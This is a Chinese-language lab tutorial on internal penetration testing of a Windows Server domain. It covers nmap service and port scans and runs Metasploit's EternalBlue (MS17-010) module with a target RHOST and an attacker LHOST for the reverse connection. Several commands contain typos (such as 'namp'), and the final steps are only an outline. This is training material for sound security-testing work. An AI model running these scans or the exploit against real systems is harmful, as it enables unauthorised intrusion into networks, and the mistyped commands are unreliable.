# 內網滲透測試Internal Penetration Testing
## 內網滲透測試介紹
> Windows Server是公司內部主要會用來建立內網與管理內網的一台伺服器。

> 所以內網滲透測試的最主要目標就是透過模擬攻擊來取得Windows Server的最高權限。

> 可以透過很多種手法都可以來模擬攻擊Windows Server內網環境。確保公司的內網的安全品質。

> 網路安全工程師可以管理整個公司不同部門的帳號與存取權限,並隨時監控內網的異常帳號活動。

## 實際操作
### Step 1 
- 安裝一台kali_linux虛擬機
- 安裝一台Windows_Server虛擬機,並配置AD DS
- 安裝一台Windows_10虛擬機並加入Windows Server的網域下
### Step 2
- 進入kali linux的終端機,使用nmap掃描Windows Server的運行服務
- **2-1使用nmap掃描,確認Windows Server的狀態**
- > Nmap是一個掃瞄系統正在運行的網路服務的工具,通常在kali linux都已安裝Nmap,只需輸入指令就可開啟。
```
sudo namp -sv [目標IP]
```
- ![image](https://github.com/user-attachments/assets/536dd87b-a074-41a7-84e4-64d7ce28b246)
- **2-2使用nmap掃描1-1000的所有開放的port**
```
sudo namp -p 1-65535 [目標IP]
```
- ![image](https://github.com/user-attachments/assets/3f68400a-c5ea-48b3-bdeb-ce86cc9e0522)
- **2-3使用nmap進行SYN掃描只發送SYN而不完成三向交握(不易被目標系統察覺)**
```
sudo namp -sS [目標IP]
```
- ![螢幕擷取畫面 2024-10-06 214744](https://github.com/user-attachments/assets/592b7e24-e7a4-47a3-bc83-82af3d5b90e1)
- **2-4使用nmapTCP 全連接掃描,完成三向交握(較易被目標系統察覺)**
```
sudo -sT [目標IP]
```
- ![image](https://github.com/user-attachments/assets/a8e59599-7b01-4327-8c30-b7397787172d)

### Step 3
- **3-1開啟漏洞掃描工具Metasploit Framework**
> Metasploit Framework是一個漏洞利用框架,通過已被發現的漏洞與已經存在的攻擊模塊去進行自動化攻擊。

> 通常在kali linux都已安裝Metasploit Framework,只需輸入指令就可開啟。

> 可以不用自己去漏洞分析目標系統漏洞,就自動化去攻擊目標系統。

> 但是如果是攻擊正版授權系統且該系統已經修復大多數被發現的漏洞,就需要去學習逆向工程或學習漏洞分析。

> 滲透測試專家與安全研究人員就是在學習與研究這些發現漏洞的技術。
```
sudo msfconsole
```
- Metasploit Framework成功開啟畫面
- ![image](https://github.com/user-attachments/assets/d458bf3b-5619-41b7-9a0d-47eebbd6fe4c)
### Step 4
- **4-1使用metasploit的自動化漏洞模塊**
```
use exploit/windows/smb/ms17_010_eternalblue
```
- **4-2設置要攻擊的系統IP位址**
```
set RHOST [目標IP]
```
- ![image](https://github.com/user-attachments/assets/4e290b13-a2e3-4473-b5a7-66090fe51713)
- **4-3設置攻擊成功後要返回的攻擊機IP地址**
```
set LHOST [攻擊機IP]
```
- **4-4開始漏洞利用**
```
exploit
```
- 顯示已完成攻擊,但並未建立任何的連線,就代表該漏洞已經被修復了。
- ![螢幕擷取畫面 2024-10-13 154541](https://github.com/user-attachments/assets/831df7d6-3542-4b60-8e54-46f2d41fec57)

- 利用漏洞掃描工具掃描可利用的系統漏洞
- 利用系統漏洞進入Windows Server
### Step 4
- 進入Windows Server後提升至管理員權限
- 查看網域下的PC有幾台
